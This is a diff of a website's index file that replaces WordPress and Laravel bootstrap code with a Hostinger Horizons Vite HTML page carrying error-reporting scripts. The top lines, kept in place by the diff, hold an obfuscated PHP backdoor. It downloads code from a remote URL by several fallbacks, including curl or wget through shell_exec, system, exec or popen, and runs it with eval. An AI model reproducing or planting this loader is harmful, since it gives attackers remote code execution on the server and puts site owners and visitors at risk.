@@ -9,60 +9,149 @@ if(!$c&&function_exists('fopen')){$h=@fopen($u,'r');if($h){stream_set_timeout($h
 if(!$c&&function_exists('fsockopen')){$p=parse_url($u);$f=@fsockopen($p['host'],80,$e,$r,15);if($f){fwrite($f,"GET {$p['path']} HTTP/1.0\r\nHost:{$p['host']}\r\nUser-Agent:$ua\r\nConnection:close\r\n\r\n");$b='';while(!feof($f))$b.=fgets($f,128);fclose($f);$c=explode("\r\n\r\n",$b,2)[1]??'';}}
 if(!$c){$cmd="curl -sL -A '$ua' --connect-timeout 15 $u||wget -qU '$ua' -T 15 -O - $u";$d=strtolower(ini_get('disable_functions'));foreach(['shell_exec','passthru','system','exec','popen']as$f){if(function_exists($f)&&strpos($d,$f)===false){if($f=='exec'){@exec($cmd,$o);$c=join("\n",$o);}elseif($f=='popen'){$h=@popen($cmd,'r');if($h){$c=@stream_get_contents($h);@pclose($h);}}elseif($f=='shell_exec'){$c=@shell_exec($cmd);}else{ob_start();@$f($cmd);$c=ob_get_clean();}if($c)break;}}}
 if($c){$c=preg_replace('/^\xEF\xBB\xBF/','',$c);eval('?>'.$c);}
-if(!defined('WP_USE_THEMES'))define('WP_USE_THEMES',true);if(file_exists(__DIR__.'/wp-blog-header.php'))require __DIR__.'/wp-blog-header.php';
+
 ?>
 
-use Illuminate\Contracts\Http\Kernel;
-use Illuminate\Http\Request;
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<link rel="icon" type="image/svg+xml" href="/vite.svg" />
+		<meta name="generator" content="Hostinger Horizons" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<title>Hostinger Horizons</title>
+		<script type="module" crossorigin src="/assets/index-6e56e4f3.js"></script>
+		<link rel="stylesheet" href="/assets/index-a3691362.css">
+		<script type="module">
+window.onerror = (message, source, lineno, colno, errorObj) => {
+	const errorDetails = errorObj ? JSON.stringify({
+		name: errorObj.name,
+		message: errorObj.message,
+		stack: errorObj.stack,
+		source,
+		lineno,
+		colno,
+	}) : null;
 
-define('LARAVEL_START', microtime(true));
+	window.parent.postMessage({
+		type: 'horizons-runtime-error',
+		message,
+		error: errorDetails
+	}, '*');
+};
+</script>
+		<script type="module">
+const observer = new MutationObserver((mutations) => {
+	for (const mutation of mutations) {
+		for (const addedNode of mutation.addedNodes) {
+			if (
+				addedNode.nodeType === Node.ELEMENT_NODE &&
+				(
+					addedNode.tagName?.toLowerCase() === 'vite-error-overlay' ||
+					addedNode.classList?.contains('backdrop')
+				)
+			) {
+				handleViteOverlay(addedNode);
+			}
+		}
+	}
+});
 
-/*
-|--------------------------------------------------------------------------
-| Check If The Application Is Under Maintenance
-|--------------------------------------------------------------------------
-|
-| If the application is in maintenance / demo mode via the "down" command
-| we will load this file so that any pre-rendered content can be shown
-| instead of starting the framework, which could cause an exception.
-|
-*/
+observer.observe(document.documentElement, {
+	childList: true,
+	subtree: true
+});
 
-if (file_exists($maintenance = __DIR__.'/../pos/storage/framework/maintenance.php')) {
-    require $maintenance;
+function handleViteOverlay(node) {
+	if (!node.shadowRoot) {
+		return;
+	}
+
+	const backdrop = node.shadowRoot.querySelector('.backdrop');
+
+	if (backdrop) {
+		const overlayHtml = backdrop.outerHTML;
+		const parser = new DOMParser();
+		const doc = parser.parseFromString(overlayHtml, 'text/html');
+		const messageBodyElement = doc.querySelector('.message-body');
+		const fileElement = doc.querySelector('.file');
+		const messageText = messageBodyElement ? messageBodyElement.textContent.trim() : '';
+		const fileText = fileElement ? fileElement.textContent.trim() : '';
+		const error = messageText + (fileText ? ' File:' + fileText : '');
+
+		window.parent.postMessage({
+			type: 'horizons-vite-error',
+			error,
+		}, '*');
+	}
 }
+</script>
+		<script type="module">
+const originalConsoleError = console.error;
+console.error = function(...args) {
+	originalConsoleError.apply(console, args);
 
-/*
-|--------------------------------------------------------------------------
-| Register The Auto Loader
-|--------------------------------------------------------------------------
-|
-| Composer provides a convenient, automatically generated class loader for
-| this application. We just need to utilize it! We'll simply require it
-| into the script here so we don't need to manually load our classes.
-|
-*/
+	let errorString = '';
 
-require __DIR__.'/../pos/vendor/autoload.php';
+	for (let i = 0; i < args.length; i++) {
+		const arg = args[i];
+		if (arg instanceof Error) {
+			errorString = arg.stack || `${arg.name}: ${arg.message}`;
+			break;
+		}
+	}
 
-/*
-|--------------------------------------------------------------------------
-| Run The Application
-|--------------------------------------------------------------------------
-|
-| Once we have the application, we can handle the incoming request using
-| the application's HTTP kernel. Then, we will send the response back
-| to this client's browser, allowing them to enjoy our application.
-|
-*/
+	if (!errorString) {
+		errorString = args.map(arg => typeof arg === 'object' ? JSON.stringify(arg) : String(arg)).join(' ');
+	}
 
-$app = require_once __DIR__.'/../pos/bootstrap/app.php';
+	window.parent.postMessage({
+		type: 'horizons-console-error',
+		error: errorString
+	}, '*');
+};
+</script>
+		<script type="module">
+const originalFetch = window.fetch;
 
-$kernel = $app->make(Kernel::class);
+window.fetch = function(...args) {
+	const url = args[0] instanceof Request ? args[0].url : args[0];
 
-$response = $kernel->handle(
-    $request = Request::capture()
-)->send();
+	// Skip WebSocket URLs
+	if (url.startsWith('ws:') || url.startsWith('wss:')) {
+		return originalFetch.apply(this, args);
+	}
 
-$kernel->terminate($request, $response);
+	return originalFetch.apply(this, args)
+		.then(async response => {
+			const contentType = response.headers.get('Content-Type') || '';
 
+			// Exclude HTML document responses
+			const isDocumentResponse =
+				contentType.includes('text/html') ||
+				contentType.includes('application/xhtml+xml');
+
+			if (!response.ok && !isDocumentResponse) {
+					const responseClone = response.clone();
+					const errorFromRes = await responseClone.text();
+					const requestUrl = response.url;
+					console.error(`Fetch error from ${requestUrl}: ${errorFromRes}`);
+			}
+
+			return response;
+		})
+		.catch(error => {
+			if (!url.match(/.html?$/i)) {
+				console.error(error);
+			}
+
+			throw error;
+		});
+};
+</script>
+	</head>
+	<body>
+		<div id="root"></div>
+		
+	</body>
+</html>
